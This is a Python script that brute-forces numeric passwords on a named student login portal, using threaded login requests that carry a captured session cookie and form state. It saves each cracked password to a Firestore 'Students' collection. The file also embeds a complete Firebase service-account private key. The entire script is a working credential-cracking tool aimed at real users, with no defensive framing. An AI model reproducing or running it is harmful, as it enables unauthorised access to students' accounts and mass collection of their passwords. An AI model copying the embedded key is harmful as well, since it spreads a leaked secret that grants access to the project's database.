import requests
import json
import argparse
from concurrent.futures import ThreadPoolExecutor
import time
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore

PRIVATE_KEY = {
  "type": "service_account",
  "project_id": "bruteit-c9a85",
  "private_key_id": "115fa9d695f20a76c000ea89b0ef0d415190387f",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDp+1av93hndyXo\n5YcTbRvcu+AkcIxumYF5NAKezHIPIv80hzgotVzgLSrKvWrOYubgEodSNQY3gds+\n9Tz/bSFyGbGo5D+3RPywK3lwYqXTaQdwRS28sEcIyZL9Trlki71op9WhXftSs3zL\n+7Q26OIp0buj5kHgFlxMHKxF2d1XduVzjJK6XdN0b3hzAS1+ZBJBmSKV0Vjgx5C1\nT4EbAafaIkTUjHeLzp9YX9Q+pieOKGvVzutGGaQL3YtrammolZaOqtIQU9zqxv5I\nfxmfdmIPh6iZKbLeU/Nj9mbG7wlnwW7iEl9IjQv3hdMSuqz/dnKJNrms9tlA9u2q\n72CibJqnAgMBAAECggEAZR6VKTk3FOf+Pzeq969Iwk2DodvuJQI8XUgn9b7/cCE8\nz9O8ZoNy3wNGIhZYaVd+1cnMJ6/4vtZlDUFpGi5srOYDzKzQCIFM/0naksJfTg1v\nBIsxKAG6wUZ0Ovrhzl1B/0/BWJrIOcaOIY3nJW/iBha5FC03vQOM4evmW827Bcft\n37Yauwfd9GEN3KcLNrGjp3H9HdNepHYoOVdUUf0UVjv0EJr7+Hp5fF5oM531tuc2\nGmzRRzxsXwJGvbthk9KGlx0gDlgN9nfjsWBwxFucxKNmW+T5hRMol4WvJTtlQUWT\nMdC0heLIW/EfymMxlfZjfKhxweoPtikhXnvujPjLSQKBgQD8Rt7t+MZTBmDFNWaO\n0VeFt4plLEl6PgVeozQm3V3wDNl2EK0gWxGNslMG1rN7KVo6gBu0s1mA9TzyYrC0\nAIGjCGXGmP646jzeW+BB23h9h4AXlQ1osQL3epPLwkkXo8iJOfFAxJT3mHYmFWck\nV+XqrGDC2kk+Z4Nkj8j3M2nxDQKBgQDtb1jd3F4klilcoGDo3fnq1D/i/MGFybd6\niaMfzazFjkhl8tYkpHSiTbwjB0UMUlJ7QXH+TrqSpdaD5ttSQeCuPzhMgOvpHGgn\n/kx7XavnCrU+NfuAx1iLFfhVMiAh+KjkbtpMfU4LG/jyM9RC+9KSVoOQif3Ow9wL\nQ+b/LUUFgwKBgQDdACjjSABVU00K9hD2JCYMGhG/N+DWmeaSVV6mfV6BoIAQkeNY\naO8jtohNgWCSEFPe08NxtXw/IJdXr2UlCxyF+iFOrVDYJTtVgB8hEmancUChaA3r\nHMaAjn1TDsyBTRWsQXo7RvtJO+Kk0jMc/3OG9aN+j0OCy6OrQNrI092HMQKBgQDW\nrtwiVpPE7wVdHCIjzDmhy+IsIi/1AUvl/zdAlV6HjjwF+kkH/q765eCbp4IWPwUX\nLzicIaFu4YYR45YhTTGTO9Ry0Ar+ztGaf8O1tB+vmy3/nx3V9ekocWgF2HnXXZeQ\nXG8DxDThtJwmmxhsrHdcG99/vFWCM/PtN6tQxSTocwKBgQDz/sXSm0jzwyr/LEXe\nvRl/ngEb9DA75yL2CmY4NDnWUcAuZSNPPPP2nhwtiQ8Z5TTcRvjCEfp+a4/2LRuW\n8lzWvGORaeKrPpHi6FH+ci2niY8b67p0sCDjj8Kk1Bis1E4bFjieEhkBNIfW885W\njzg+j5itP03LgXpkA41vVjOdEg==\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-21o6a@bruteit-c9a85.iam.gserviceaccount.com",
  "client_id": "111017131315253178779",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-21o6a%40bruteit-c9a85.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

cred = credentials.Certificate(PRIVATE_KEY)
firebase_admin.initialize_app(cred)

def addPasswordToFirestore(userid, password):

    db = firestore.client()
    data = {"password":password}
    db.collection('Students').document(userid).set(data)

def getPasswordFromFirestore(userid):

    fuserId = userid.replace("/", "-")
    db = firestore.client()
    doc_ref = db.collection('Students').document(fuserId).get()
    password = doc_ref.to_dict().get('password')
    return password

def findFirestoreStudent(userid):

    fuserId = userid.replace("/", "-")
    db = firestore.client()
    doc_ref = db.collection('Students').document(fuserId).get()
    return doc_ref.exists

#Sends a request to saksham portal with specified id and pasword
def attemptLogin(userId, password):
    url = 'https://saksham.sitslive.com/login'

    headers = {
    "accept": "*/*" ,
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7", 
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8", 
    "cookie": "ASP.NET_SessionId=w3xnaxbvl5d3j4gdz3xtlnf3", 
    "origin": "https://saksham.sitslive.com", 
    "priority": "u=1, i", 
    "referer": "https://saksham.sitslive.com/login", 
    "sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"", 
    "sec-ch-ua-mobile": "?0", 
    "sec-ch-ua-platform": "\"Windows\"", 
    "sec-fetch-dest": "empty", 
    "sec-fetch-mode": "cors", 
    "sec-fetch-site": "same-origin", 
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", 
    "x-microsoftajax": "Delta=true", 
    "x-requested-with": "XMLHttpRequest" 
    }

    payload = {
        "data-daw": "ScriptManager1=updatepanel%7CbtnLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=GXq8WYlFoIyiG3kHh%2FyWm36EVSPnNg9oMUi9wBqeXZ5oLCwDaEF1fWGlZu6NIZKEGzs%2FZqM8kQDJ35ynh50OxuDTdeqaTh4wZe5gn2NIsPG1M9Ds%2BzDSx0hHu317Lrbw&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=k9EujBZLYjXQ6rTY4Kfb27V%2FFrBy8Ba23xg9ZaR9inInhEHhMnDnorNbGIO4S1IWOPs2u1aAPCkn5ieUxwSc0CgIlxhouE9FPckXsb%2F078IUjLS6AJvoaw3K%2F%2BAABCmEBzF1Ae469WWe4mDfDZPlJyLwg8Y3lH9jol6vnwidKeaSu%2FewI8Hnv04%2BBd2lhQqFFWErXV4tmCmIKvRSer%2FfDZ1HHrJ3Vk%2FQdhUnj8JX2LHHfAeU5ALRWJxbSolA%2FDYVhU8PM7E3jQd1FBYJtVrqHwAgbSxV%2B6dPvyEDYjFbaiHkiz84m5JxTVPK53KMH%2Bpa&txtLoginID="+userId+"&txtPassword="+password+"&ddlType=0&txtUserName=&__ASYNCPOST=true&btnLogin=Login",
    }

    response = requests.post(url, headers=headers, data=json.dumps(payload))

    if "pageRedirect" in response.text:
        return password
    else:
        return None

#batchSize is the no. of request to be sent at once
#start is the password to start from 
def bruteforceLogin(userId, start, batchSize=100, threads=10):
    p = start
    q = start + batchSize
    muserId = userId.replace("/", "%2F")
    fuserId = userId.replace("/", "-")


    while True:
        pool = ThreadPoolExecutor(threads)
        futures = []

        print(f"Bruteforcing passwords from: {p} to {q}")
        for i in range(p, q):
            future = pool.submit(attemptLogin, muserId, str(i))
            futures.append(future)

        for f in futures:
            if f.result() is not None:
                addPasswordToFirestore(fuserId, f.result())
                print(f"Password for {userId} is: {f.result()}")
                return
        
        if p>10000:
            print("Username does not exist")
            return
            
        p+=batchSize
        q+=batchSize




if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--uid', type=str, help='The user ID to bruteforce.')
    parser.add_argument('-s','--start', type=int, default=1000, help='The starting point for the bruteforce.')
    parser.add_argument('-b','--batchSize', type=int, default=100, help='The size of each batch of passwords to try (default: 100).')
    parser.add_argument('-t','--threads', type=int, default=10, help='The number of threads to use (default: 10).')
    args = parser.parse_args()
    

    if args.uid is None:
        print("Error: Please provide a userId with -u")
        quit()

    if findFirestoreStudent(args.uid) is False:
        
        start_time = time.perf_counter()

        bruteforceLogin(args.uid, args.start, args.batchSize, args.threads)

        end_time = time.perf_counter()
        elapsed_time = str(end_time - start_time)
        print(f"Time taken: {elapsed_time} seconds")

    else:
        print(f"Password found in database for {args.uid}: {getPasswordFromFirestore(args.uid)}")
